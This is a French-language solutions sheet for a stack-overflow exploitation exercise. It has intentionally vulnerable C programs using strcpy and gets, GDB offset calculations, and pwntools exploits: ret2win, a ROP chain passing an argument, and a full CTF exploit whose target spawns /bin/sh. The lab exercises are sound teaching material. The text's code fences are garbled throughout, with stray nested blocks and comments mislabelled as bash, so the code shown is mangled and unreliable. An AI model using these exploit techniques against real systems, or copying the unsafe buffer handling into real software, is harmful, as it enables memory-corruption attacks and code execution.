SOLUTIONS - EXERCICE 16 : STACK OVERFLOW ET REDIRECTION D'EXÉCUTION

⚠️ Ces solutions sont éducatives. Ne les utilise que sur tes propres systèmes.

══════════════════════════════════════════════════════════════════
DÉFI 1 : CALCULER L'OFFSET AVEC GDB
══════════════════════════════════════════════════════════════════

Code (defi1.c) :
```c

```c
#include <stdio.h>
#include <string.h>
```


```c
void vulnerable(char *input) {
    char buffer[64];
```
    strcpy(buffer, input);  // VULNÉRABLE
}


```c
int main(int argc, char **argv) {
```
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable(argv[1]);
    return 0;
}
```

Compilation :
gcc -g -fno-stack-protector -no-pie defi1.c -o defi1

Analyse GDB :
gdb ./defi1
(gdb) break vulnerable
(gdb) run AAAA
(gdb) info frame
(gdb) print &buffer
(gdb) print $rbp
(gdb) print $rbp + 8
(gdb) print/d ($rbp + 8) - &buffer

Résultat typique :
buffer @ 0x7fffffffe380

```bash
$rbp = 0x7fffffffe3c0
return address @ 0x7fffffffe3c8
```
Offset : 72 bytes (64 + 8)

══════════════════════════════════════════════════════════════════
DÉFI 2 : REDIRECTION VERS WIN()
══════════════════════════════════════════════════════════════════

Code (defi2.c) :
```c

```c
#include <stdio.h>
#include <string.h>
```


```c
void win() {
```
    printf("\n🎉 WIN! Exécution détournée!\n");
    printf("FLAG{stack_pwn3d}\n");
}


```c
void vulnerable() {
    char buffer[64];
```
    printf("Adresse de win(): %p\n", win);
    gets(buffer);  // VULNÉRABLE
}


```c
int main() {
```
    vulnerable();
    return 0;
}
```

Compilation :
gcc -fno-stack-protector -z execstack -no-pie defi2.c -o defi2

Trouver l'adresse de win() :
objdump -d defi2 | grep '<win>'

```bash
# Résultat : 0000000000401142 <win>
```

Exploit Python (exploit2.py) :
```python
import struct

win_addr = 0x401142  # À ajuster selon ton binaire
offset = 72  # 64 bytes buffer + 8 bytes saved RBP

payload = b'A' * offset
payload += struct.pack('<Q', win_addr)

print(payload.decode('latin1'))
```

Utilisation :
python exploit2.py | ./defi2

══════════════════════════════════════════════════════════════════
DÉFI 3 : RETURN-TO-FUNCTION AVEC ARGUMENTS
══════════════════════════════════════════════════════════════════

Code (defi3.c) :
```c

```c
#include <stdio.h>
#include <string.h>
```


```c
void print_flag(int code) {
```
    printf("Code reçu : 0x%x\n", code);
    if (code == 0x1337) {
        printf("🚩 FLAG{correct_arg_passed}\n");
    } else {
        printf("Code incorrect.\n");
    }
}


```c
void vuln() {
    char buf[100];
```
    gets(buf);
}


```c
int main() {
```
    vuln();
    return 0;
}
```

Pour passer un argument, il faut un gadget ROP "pop rdi; ret" :
ROPgadget --binary defi3 | grep "pop rdi"

Exploit avec pwntools :
```python
from pwn import *

binary = ELF('./defi3')
rop = ROP(binary)

print_flag_addr = binary.symbols['print_flag']
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

payload = b'A' * 108  # offset
payload += p64(pop_rdi)
payload += p64(0x1337)  # argument
payload += p64(print_flag_addr)

p = process('./defi3')
p.sendline(payload)
p.interactive()
```

══════════════════════════════════════════════════════════════════
DÉFI 8 : EXPLOITATION COMPLÈTE CTF
══════════════════════════════════════════════════════════════════

Code complet (ctf.c) :
```c

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
```


```c
void win() {
```
    printf("\n╔════════════════════╗\n");
    printf("║   VOUS AVEZ GAGNÉ! ║\n");
    printf("╚════════════════════╝\n");
    system("/bin/sh");
}


```c
void vulnerable() {
    char buffer[128];
```
    printf("Entrez votre payload : ");
    gets(buffer);  // VULNÉRABLE
}


```c
int main() {
```
    printf("CTF Challenge - Stack Overflow\n");
    printf("Trouvez un moyen d'appeler win()\n\n");
    

```c
    // Leak optionnel
```
    printf("Adresse de win() : %p\n", win);
    
    vulnerable();
    
    printf("Fin normale du programme.\n");
    return 0;
}
```

Compilation :
gcc -fno-stack-protector -z execstack -no-pie ctf.c -o ctf

Exploit complet (exploit_ctf.py) :
```python

```bash
#!/usr/bin/env python3
```
from pwn import *


```bash
# Configuration
```
binary = ELF('./ctf')
context.binary = binary
context.log_level = 'info'


```bash
# Lancer le processus
```
p = process('./ctf')


```bash
# Recevoir le leak d'adresse
```
p.recvuntil(b'Adresse de win() : ')
win_addr = int(p.recvline().strip(), 16)

log.info(f"Adresse de win() leakée : {hex(win_addr)}")


```bash
# Calculer le payload
```
offset = 136  # 128 + 8
payload = b'A' * offset
payload += p64(win_addr)

log.info(f"Taille du payload : {len(payload)} bytes")
log.info("Envoi du payload...")


```bash
# Envoyer
```
p.sendline(payload)


```bash
# Interactif
```
p.interactive()
```

Exécution :
python exploit_ctf.py

══════════════════════════════════════════════════════════════════
TECHNIQUES AVANCÉES
══════════════════════════════════════════════════════════════════

1. Pattern de De Bruijn :
```python
from pwn import *
pattern = cyclic(200)

```bash
# Après crash, utiliser cyclic_find()
```
```

2. Dump de mémoire avec GDB :
gdb ./prog
(gdb) run $(python -c "print('A'*200)")
(gdb) x/32gx $rsp

```bash
# Trouver où se situent les 'A' (0x41)
```

3. Automatisation avec pwntools :
```python
from pwn import *

p = process('./vuln')
win = p64(0x401142)
payload = fit({
    72: win  # offset: valeur
})
p.sendline(payload)
```

══════════════════════════════════════════════════════════════════
NOTES IMPORTANTES
══════════════════════════════════════════════════════════════════

- Offsets peuvent varier selon compilateur et architecture
- Utilise toujours GDB pour vérifier les offsets exacts
- Little-endian pour x86/x64 : struct.pack('<Q', addr)
- ASLR doit être désactivé ou tu dois leak les adresses
- Ces exploits nécessitent -fno-stack-protector -z execstack -no-pie

